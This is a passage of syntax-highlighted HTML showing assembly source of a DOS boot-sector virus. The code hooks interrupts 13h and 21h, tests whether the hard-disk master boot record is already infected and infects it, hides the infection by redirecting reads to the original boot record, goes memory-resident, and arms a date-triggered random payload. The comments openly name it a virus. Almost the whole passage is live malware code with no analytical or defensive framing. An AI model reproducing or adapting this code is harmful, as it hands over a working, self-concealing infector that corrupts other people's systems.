                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; on next one</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">put_calls_t</span><span class="sc0">


                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int_jumper</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">4f0h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int_jumper_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int_jumper</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">; copy the other bounch of</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">; code</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">; DI = to 13h in IVT</span><span class="sc0">

                </span><span class="sc6">stosw</span><span class="sc0">                           </span><span class="sc1">; store offset to the stored</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; jump at 0:4f0h as new int13h</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                           </span><span class="sc1">; store our segment</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_nfect</span><span class="sc0">             </span><span class="sc1">; check to infect mbr</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">already_orbad</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_mbr</span><span class="sc0">
</span><span class="sc5">already_orbad</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">                    </span><span class="sc1">; jmp far to original mbr</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">7C00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; or floppy boot</span><span class="sc0">

</span><span class="sc5">int_jumper</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e8h</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">228h</span><span class="sc4">-</span><span class="sc2">4f3h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">86h</span><span class="sc0">                     </span><span class="sc1">; original int13h</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">                       </span><span class="sc1">; back to reality</span><span class="sc0">
</span><span class="sc5">int_jumper_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc5">handler_13h</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; this is the virus int13h handler that is installed as soon as the virus gets</span><span class="sc0">
</span><span class="sc1">; resident from mbr or fbs</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">reading_mbr</span><span class="sc0">             </span><span class="sc1">; check if reading mbr</span><span class="sc0">

                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; on ivt</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">              </span><span class="sc1">; on int21h entry</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; int21h handler seg</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">via_da_qui</span><span class="sc0">                      </span><span class="sc1">; check if dos</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">800h</span><span class="sc0">                         </span><span class="sc1">; seems loaded</span><span class="sc0">
                </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">via_da_qui</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc2">27h</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">via_da_qui</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">                                     </span><span class="sc1">; so hook int21h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; bx int21h handler off</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">4eeh</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; di points on last</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0e9h</span><span class="sc0">           </span><span class="sc1">; used call + jmp block</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">           </span><span class="sc1">; jmp $+3</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                          </span><span class="sc1">; di + 8 points on</span><span class="sc0">
                                                        </span><span class="sc1">; the next call+jmp</span><span class="sc0">
                                                        </span><span class="sc1">; (look mem map up)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">4eeh</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">           </span><span class="sc1">; store offset to the</span><span class="sc0">
                                                        </span><span class="sc1">; actually used one</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">           </span><span class="sc1">; segment and offset for</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; the jmp far</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc2">87h</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">)],</span><span class="sc8">bx</span><span class="sc0">      </span><span class="sc1">; int87h is the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc2">87h</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; original int21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">             </span><span class="sc1">; int21h points now</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">           </span><span class="sc1">; to last virus handler</span><span class="sc0">
</span><span class="sc5">via_da_qui</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">reading_mbr</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; read function</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_mbrstealth</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_mbrstealth</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                  </span><span class="sc1">; reading mbr</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_mbrstealth</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">                      </span><span class="sc1">; stealth to original mbr</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc5">no_mbrstealth</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">memory_residence</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5800h</span><span class="sc0">                </span><span class="sc1">; get memory alloc startegy</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5802h</span><span class="sc0">                </span><span class="sc1">; get umb link state</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                  </span><span class="sc1">; set memory alloc strategy</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                  </span><span class="sc1">; to first fit, try high first</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                  </span><span class="sc1">; set umb link state</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                  </span><span class="sc1">; add umb to dos chain</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">                  </span><span class="sc1">; allocate needed memory</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">virus_paras</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">came_here</span><span class="sc0">               </span><span class="sc1">; exit on error</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; on virus mem block mcb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc2">8h</span><span class="sc0">    </span><span class="sc1">; set as dos owned</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">208h</span><span class="sc0">                 </span><span class="sc1">; read eight virus sectors</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">; to allocated memory</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b9h</span><span class="sc0">                    </span><span class="sc1">; mov cx,</span><span class="sc0">
</span><span class="sc5">read_from_cx</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">5102h</span><span class="sc0">                   </span><span class="sc1">; where from hd or fd</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0bah</span><span class="sc0">                    </span><span class="sc1">; mov dx,</span><span class="sc0">
</span><span class="sc5">read_from_dx</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0h</span><span class="sc0">                      </span><span class="sc1">; where from dx</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">86h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">1515h</span><span class="sc0">                </span><span class="sc1">; internal virus value</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">; jump again to beginning</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; of the virus</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">
</span><span class="sc5">came_here</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5803h</span><span class="sc0">                </span><span class="sc1">; set umb link state</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">                   </span><span class="sc1">; restore the old one</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5801h</span><span class="sc0">                </span><span class="sc1">; set mem alloc strategy</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; restore the old one</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; exiting mem loading routines</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">handler_13h_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">

</span><span class="sc5">run_from_mem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">                          </span><span class="sc1">; nop opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">04eeh</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; pointer on actual</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">jmp_far_off</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">    </span><span class="sc1">; res+21h block</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; delete the call to the residency</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; routine with NOPs</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; DI now points on the original seg:off</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; of the int21h, stored before after the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">           </span><span class="sc1">; JMP FAR and make SI point the same</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">4f0h</span><span class="sc0">         </span><span class="sc1">; point DI where the Int13h handler</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; resides and cover the CALL to 228h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; (this is the int21h checker) with</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; nops</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">old_int21h</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">                   </span><span class="sc1">; SI points on adress of original int21h</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">                   </span><span class="sc1">; and put that in dword old_int21h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; pop pointer to int21h seg:off</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int21h_handler</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; now put the virus handler instead</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">           </span><span class="sc1">; of it, this is hook int 21h</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">228h</span><span class="sc0">                 </span><span class="sc1">; delete the first int13h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0b1h</span><span class="sc0">                 </span><span class="sc1">; handler with mem res stuff</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; from memory</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">payload_byte</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">value_ax1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; virus values</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">value_ax2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; initialization</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">88h</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">entry_88h</span><span class="sc0"> </span><span class="sc1">; hook int88h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc2">88h</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">04f4h</span><span class="sc4">],</span><span class="sc2">088h</span><span class="sc0">    </span><span class="sc1">; change int86h to int88h</span><span class="sc0">
                                   </span><span class="sc1">; in the virus int13h handler. this means,</span><span class="sc0">
                                   </span><span class="sc1">; install the int13h handler that infects</span><span class="sc0">
                                   </span><span class="sc1">; boots instead of the one waiting to hook</span><span class="sc0">
                                   </span><span class="sc1">; int21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                  </span><span class="sc1">; get real time clock in bcd</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">1ah</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1996h</span><span class="sc0">                </span><span class="sc1">; check if year &lt; 1996</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">no_act</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">loccaz</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">                  </span><span class="sc1">; check month</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">no_act</span><span class="sc0">
</span><span class="sc5">loccaz</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0707h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                   </span><span class="sc1">; way random to see if is</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_act</span><span class="sc0">                  </span><span class="sc1">; gonna activate or not</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">                      </span><span class="sc1">; if so select one way to</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">payload_byte</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">   </span><span class="sc1">; activate</span><span class="sc0">
</span><span class="sc5">no_act</span><span class="sc4">:</span><span class="sc0">
